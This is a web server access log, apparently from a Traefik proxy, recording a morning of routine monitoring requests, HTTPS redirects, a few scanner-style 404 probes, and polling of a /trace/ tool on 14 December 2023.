167.71.120.76 - - [14/Dec/2023:05:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 707 "www@docker" "http://172.25.0.8:80" 0ms
39.149.12.116 - - [14/Dec/2023:05:00:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 708 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [14/Dec/2023:05:01:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 709 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 710 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 711 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 712 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 713 "www@docker" "http://172.25.0.8:80" 1ms
164.52.0.94 - - [14/Dec/2023:05:02:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 714 "-" "-" 0ms
50.3.85.38 - - [14/Dec/2023:05:02:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 715 "-" "-" 0ms
164.52.0.94 - - [14/Dec/2023:05:02:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 716 "-" "-" 0ms
164.52.0.94 - - [14/Dec/2023:05:02:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 717 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 718 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:27 +0000] "GET /trace/ HTTP/2.0" 304 0 "-" "-" 719 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:27 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 720 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:03:27 +0000] "GET /trace/start.php?id=rmxlsv18m HTTP/2.0" 200 104 "-" "-" 721 "livetrace@docker" "http://172.25.0.5:80" 4ms
173.48.140.140 - - [14/Dec/2023:05:03:28 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 235 "-" "-" 722 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:29 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 309 "-" "-" 723 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:30 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 384 "-" "-" 724 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:03:31 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 458 "-" "-" 725 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:32 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 533 "-" "-" 726 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:33 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 608 "-" "-" 727 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:34 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 682 "-" "-" 728 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:03:35 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 756 "-" "-" 729 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:03:36 +0000] "GET /trace/poll.php?id=rmxlsv18m HTTP/2.0" 200 1058 "-" "-" 730 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 731 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 732 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 733 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 734 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 735 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:09 +0000] "GET /trace/ HTTP/2.0" 304 0 "-" "-" 736 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:09 +0000] "GET /trace/start.php?id=7pd8jwllw HTTP/2.0" 200 104 "-" "-" 737 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:06:10 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 235 "-" "-" 738 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:11 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 309 "-" "-" 739 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:06:12 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 384 "-" "-" 740 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:13 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 459 "-" "-" 741 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:14 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 533 "-" "-" 742 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:15 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 608 "-" "-" 743 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:06:16 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 682 "-" "-" 744 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:06:17 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 757 "-" "-" 745 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:18 +0000] "GET /trace/poll.php?id=7pd8jwllw HTTP/2.0" 200 1058 "-" "-" 746 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:05:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 747 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:06:24 +0000] "GET /ip/ HTTP/2.0" 200 895 "-" "-" 748 "www@docker" "http://172.25.0.8:80" 10ms
167.71.120.76 - - [14/Dec/2023:05:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 749 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:05:06:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 750 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 751 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 752 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 753 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 754 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 755 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 756 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 757 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 758 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 759 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 760 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 761 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 762 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 763 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 764 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 765 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 766 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 767 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 768 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 769 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 770 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 771 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 772 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 773 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 774 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 775 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 776 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 777 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 778 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 779 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 780 "www@docker" "http://172.25.0.8:80" 1ms
198.199.117.94 - - [14/Dec/2023:05:21:42 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 781 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 782 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 783 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 784 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 785 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 786 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 787 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 788 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 789 "www@docker" "http://172.25.0.8:80" 0ms
68.69.186.30 - - [14/Dec/2023:05:25:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 790 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [14/Dec/2023:05:26:22 +0000] "GET /ip/ HTTP/2.0" 200 895 "-" "-" 791 "www@docker" "http://172.25.0.8:80" 10ms
159.203.109.206 - - [14/Dec/2023:05:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 792 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 793 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 794 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 795 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 796 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 797 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 798 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 799 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 800 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 801 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 802 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 803 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 804 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 805 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 806 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 807 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 808 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 809 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 810 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 811 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 812 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 813 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:36:37 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 814 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 815 "www@docker" "http://172.25.0.8:80" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:44 +0000] "GET /ab2g HTTP/1.1" 404 19 "-" "-" 816 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:45 +0000] "GET /ab2h HTTP/1.1" 404 19 "-" "-" 817 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 818 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 819 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:49 +0000] "GET /t4 HTTP/1.1" 404 19 "-" "-" 820 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:49 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 821 "-" "-" 0ms
142.93.80.183 - - [14/Dec/2023:05:36:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 822 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 823 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 824 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 825 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 826 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 827 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 828 "www@docker" "http://172.25.0.8:80" 0ms
167.248.133.50 - - [14/Dec/2023:05:40:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 829 "web-to-websecure@internal" "-" 0ms
167.248.133.50 - - [14/Dec/2023:05:40:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 830 "web-to-websecure@internal" "-" 0ms
167.248.133.50 - - [14/Dec/2023:05:40:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 831 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:05:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 832 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 833 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 834 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 835 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 836 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 837 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 838 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 839 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 840 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 841 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 842 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 843 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 844 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 845 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 846 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 847 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:05:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 848 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:05:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 849 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:48:51 +0000] "GET /trace/ HTTP/2.0" 304 0 "-" "-" 850 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:48:51 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 852 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [14/Dec/2023:05:48:51 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 851 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:48:51 +0000] "GET /trace/start.php?id=p26auqm5g HTTP/2.0" 200 104 "-" "-" 853 "livetrace@docker" "http://172.25.0.5:80" 4ms
173.48.140.140 - - [14/Dec/2023:05:48:52 +0000] "GET /trace/poll.php?id=p26auqm5g HTTP/2.0" 200 12 "-" "-" 854 "livetrace@docker" "http://172.25.0.5:80" 1034ms
173.48.140.140 - - [14/Dec/2023:05:48:53 +0000] "GET /trace/poll.php?id=p26auqm5g HTTP/2.0" 404 16 "-" "-" 855 "www@docker" "http://172.25.0.8:80" 36ms
173.48.140.140 - - [14/Dec/2023:05:49:01 +0000] "GET /trace/start.php?id=sk8fkmx6f HTTP/2.0" 200 104 "-" "-" 856 "livetrace@docker" "http://172.25.0.5:80" 16ms
173.48.140.140 - - [14/Dec/2023:05:49:02 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 235 "-" "-" 857 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:49:03 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 309 "-" "-" 858 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:04 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 383 "-" "-" 859 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:05 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 457 "-" "-" 860 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:06 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 532 "-" "-" 861 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:49:07 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 607 "-" "-" 862 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:08 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 681 "-" "-" 863 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:09 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 755 "-" "-" 864 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:49:10 +0000] "GET /trace/poll.php?id=sk8fkmx6f HTTP/2.0" 200 1055 "-" "-" 865 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:05:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 866 "www@docker" "http://172.25.0.8:80" 19ms
167.71.120.76 - - [14/Dec/2023:05:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 867 "www@docker" "http://172.25.0.8:80" 17ms
159.203.109.206 - - [14/Dec/2023:05:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 868 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:05:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 869 "www@docker" "http://172.25.0.8:80" 20ms
173.48.140.140 - - [14/Dec/2023:05:51:00 +0000] "GET /trace/ HTTP/2.0" 200 752 "-" "-" 870 "livetrace@docker" "http://172.25.0.5:80" 21ms
173.48.140.140 - - [14/Dec/2023:05:51:00 +0000] "GET /trace/start.php?id=xdq5gjuqt HTTP/2.0" 200 104 "-" "-" 871 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:51:13 +0000] "GET /trace/ HTTP/2.0" 200 752 "-" "-" 872 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:51:13 +0000] "GET /trace/start.php?id=15xv1z50o HTTP/2.0" 200 104 "-" "-" 873 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [14/Dec/2023:05:51:15 +0000] "GET /trace/ HTTP/2.0" 200 752 "-" "-" 874 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:51:16 +0000] "GET /trace/start.php?id=dijumg80z HTTP/2.0" 200 104 "-" "-" 875 "livetrace@docker" "http://172.25.0.5:80" 3ms
159.203.109.206 - - [14/Dec/2023:05:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 876 "www@docker" "http://172.25.0.8:80" 16ms
167.71.120.76 - - [14/Dec/2023:05:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 877 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [14/Dec/2023:05:51:58 +0000] "GET /trace/index.php HTTP/2.0" 200 752 "-" "-" 878 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:51:58 +0000] "GET /trace/start.php?id=0jmsqy22y HTTP/2.0" 200 104 "-" "-" 879 "livetrace@docker" "http://172.25.0.5:80" 4ms
173.48.140.140 - - [14/Dec/2023:05:52:04 +0000] "GET /trace/index.php HTTP/2.0" 200 752 "-" "-" 880 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:52:04 +0000] "GET /trace/start.php?id=3iocfzr1e HTTP/2.0" 200 104 "-" "-" 881 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [14/Dec/2023:05:52:05 +0000] "GET /trace/index.php HTTP/2.0" 200 752 "-" "-" 882 "livetrace@docker" "http://172.25.0.5:80" 4ms
